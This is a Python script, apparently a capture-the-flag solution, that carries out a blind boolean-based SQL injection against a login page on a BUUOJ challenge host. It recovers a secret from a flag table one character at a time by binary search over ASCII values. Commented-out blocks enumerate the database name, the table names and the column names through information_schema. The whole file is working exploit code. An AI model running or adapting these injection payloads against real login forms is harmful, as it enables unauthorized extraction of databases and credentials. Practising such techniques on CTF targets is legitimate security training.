import requests
import time
url = "http://2382e2aa-85c7-4e0a-9464-01a702cf565b.node4.buuoj.cn:81/templates/login.php"

files = {"file": "123456789"}



'''字段值'''
flag=''
for i in range(1,100):
    low = 32
    high = 128
    mid = (low+high)//2
    while (low < high):
        time.sleep(0.06)
        # payload_flag ={'username': "test\" or (ascii(substr((select group_concat(username) from ptbctf ),{0},1))>{1}) #".format(i, mid),'password': 'test'}
        payload_flag = {
            'username': "test\" or (ascii(substr((select group_concat(secret) from flag_tbl ),{0},1))>{1}) #".format(i,mid),'password': 'test'}
        r = requests.post(url=url,params=payload_flag,files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"},
                  cookies={"PHPSESSID": "test1"})

        print(payload_flag)
        if '<meta http-equiv="refresh" content="0; url=?p=home" />' in r.text:
            low = mid +1
        else:
            high = mid
        mid = (low + high) // 2
    if(mid==32 or mid == 132):
        break
    flag +=chr(mid)
    print(flag)

print(flag)

# column=''
# for i in range(1,100):
#     low = 32
#     high = 128
#     mid = (low+high)//2
#     while (low < high):
#         time.sleep(0.06)
#         payload_column ={'username': "test\" or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\'flag_tbl\' ),{0},1))>{1}) #".format(i, mid),'password': 'test'}
#         r = requests.post(url=url,params=payload_column,files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"},
#                   cookies={"PHPSESSID": "test1"})
#
#         print(payload_column)
#         if '<meta http-equiv="refresh" content="0; url=?p=home" />' in r.text:
#             low = mid +1
#         else:
#             high = mid
#         mid = (low + high) // 2
#     if(mid==32 or mid == 132):
#         break
#     column +=chr(mid)
#     print(column)
#
# print(column)

# '''表名'''
# table=''
# for i in range(1,100):
#     low = 32
#     high = 128
#     mid = (low+high)//2
#     while (low < high):
#         time.sleep(0.06)
#         payload_table ={'username': 'test" or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=\'ptbctf\'),{0},1))>{1}) #'.format(i, mid),'password': 'test'}
#         r = requests.post(url=url,params=payload_table,files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"},
#                   cookies={"PHPSESSID": "test1"})
#         print(payload_table)
#         if '<meta http-equiv="refresh" content="0; url=?p=home" />' in r.text:
#             low = mid +1
#         else:
#             high = mid
#         mid = (low + high) // 2
#     if(mid==32 or mid == 132):
#         break
#     table+=chr(mid)
#     print(table)
#
# print(table)

# '''数据库名'''
# database=''
# for i in range(1,100):
#     low = 32
#     high = 128
#     mid = (low+high)//2
#     while (low < high):
#         time.sleep(0.06)
#         payload_database ={'username': 'test" or (ascii(substr((select database()),{0},1))>{1}) #'.format(i, mid),'password': 'test'}
#         r = requests.post(url=url,params=payload_database,files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"},
#                   cookies={"PHPSESSID": "test1"})
#         print(payload_database)
#         if '<meta http-equiv="refresh" content="0; url=?p=home" />' in r.text:
#             low = mid +1
#         else:
#             high = mid
#         mid = (low + high) // 2
#     if(mid==32 or mid == 132):
#         break
#     database+=chr(mid)
#     print(database)
#
# print(database)
